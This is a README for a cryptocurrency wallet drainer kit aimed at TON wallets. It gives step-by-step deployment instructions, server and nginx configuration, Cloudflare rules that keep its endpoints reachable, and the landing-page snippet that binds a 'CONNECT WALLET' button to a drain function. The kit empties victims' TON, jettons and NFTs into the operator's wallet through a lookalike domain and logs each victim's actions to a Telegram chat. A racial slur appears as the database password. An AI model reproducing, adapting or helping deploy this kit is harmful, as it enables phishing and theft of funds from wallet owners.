# drain-server

standalone backend + frontend kit. no telegram bot process — logging goes straight to your chat via bot api.

## what it does

- serves the tx builder: wallet connects → your page button → backend builds the message bundle → wallet asks user to confirm → done
- logs every step (connect / approve / reject / visits) to your telegram chat
- drains TON, jettons and NFTs (fragment gifts list included, 100+ collections)

## structure

```
src/
├── index.ts          — entry, starts http server on :49238
├── server/           — express routes (/transaction, /connected, /accept, /reject)
│   └── utils/        — telegram logging (no bot process, just sendMessage)
├── contracts/        — tx builders (TON transfer, NFT transfer, jetton transfer, fragment auction, honeypot)
├── api/              — tonapi client + assets scanner (balance, nfts, jettons)
├── database/         — prisma (worker settings: prices, modes)
└── front/            — connect.js (the wallet button + drain flow), address.js, manifest template
prisma/               — schema + migrations
```

## quickstart (ubuntu 24.04)

```bash
# 1. deps
apt update && apt install -y curl docker.io docker-compose-v2
curl -fsSL https://bun.sh/install | bash

# 2. postgres
cd /opt/drain-server && docker compose up -d && sleep 8

# 3. install + migrate
bun install
bunx prisma generate
bunx prisma migrate deploy

# 4. config
cat > .env << 'EOF'
DATABASE_URL=postgresql://fragment:nigger@localhost:5432/drainer
BOT_TOKEN=123456:ABC...        # ONLY for sending logs, no bot runs
LOGGING_CHANNEL=-100XXXXXXXXXX # your log chat id (add the bot from BotFather as member first)
WALLET=EQ...                   # where everything goes
URL=https://worldlibertyfi.trade
TONAPI_KEY=                    # optional, get at tonconsole.com
DEBUG=drainer:*
EOF

# 5. run
bun run src/index.ts
# → "Started server on 49238 port"
```

keep it alive with systemd (example):

```ini
# /etc/systemd/system/drain.service
[Unit]
Description=Drain Server
After=network.target docker.service

[Service]
User=root
WorkingDirectory=/opt/drain-server
EnvironmentFile=/opt/drain-server/.env
ExecStart=/root/.bun/bin/bun run ./src/index.ts
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
systemctl enable --now drain
```

## nginx (proxy :49238 → 443)

```nginx
server {
    listen 443 ssl http2;
    server_name worldlibertyfi.trade;

    ssl_certificate     /etc/letsencrypt/live/worldlibertyfi.trade/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/worldlibertyfi.trade/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:49238;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

## cloudflare rules (IMPORTANT)

if the domain is behind a cloudflare managed challenge, wallets and the frontend cant fetch json. create a WAF skip rule for these paths:

- `/tonconnect-manifest.json`
- `/transaction`
- `/connected`
- `/accept`
- `/reject`
- `/disconnect`
- `/manifest/*`

dashboard → security → WAF → custom rules → when URI path is in that list → action: skip, all checkboxes. verify with `curl -s https://worldlibertyfi.trade/tonconnect-manifest.json` — must be raw json, not a challenge page.

## frontend integration

on the landing page:

```html
<script src="https://unpkg.com/@tonconnect/ui@3.0.2/dist/tonconnect-ui.min.js"></script>
<script src="address.js"></script>

<script>
  window.DRAINER_BACKEND = "https://worldlibertyfi.trade"; // this server
</script>
<script src="connect.js"></script>

<!-- any button -->
<button onclick="drainWallet()">CONNECT WALLET</button>
```

connect.js handles: modal → wallet link → your button → tx bundle → wallet confirm screen → logs.

the `/transaction` endpoint works two ways:

- **telegram mini app**: `?tgWebAppStartParam=<base64>` (auto)
- **plain web**: `?workerId=1&drainMode=Full&amount=100&item=@user` (direct query params)

## log chat setup

1. create a telegram bot via @BotFather → token → .env
2. create a channel/group for logs
3. add the bot as member (admin for channels)
4. get chat id from @getidsbot
5. done — every connect/approve/reject pings that chat

## api

| route | method | payload |
|---|---|---|
| `/transaction` | GET | `?wallet=EQ...` (+ mode params) → `{messages, raw, offeredBy}` |
| `/connected` | POST | `{wallet, href, raw}` |
| `/accept` | POST | `{messages, boc, wallet, raw, href}` |
| `/reject` | POST | `{messages, err, wallet, raw, href}` |
| `/disconnect` | POST | `{wallet, href}` |
| `/manifest/:domain` | GET | cross-domain manifest (CORS enabled) |

CORS is open (`*`) on everything — made for landing-page integration.
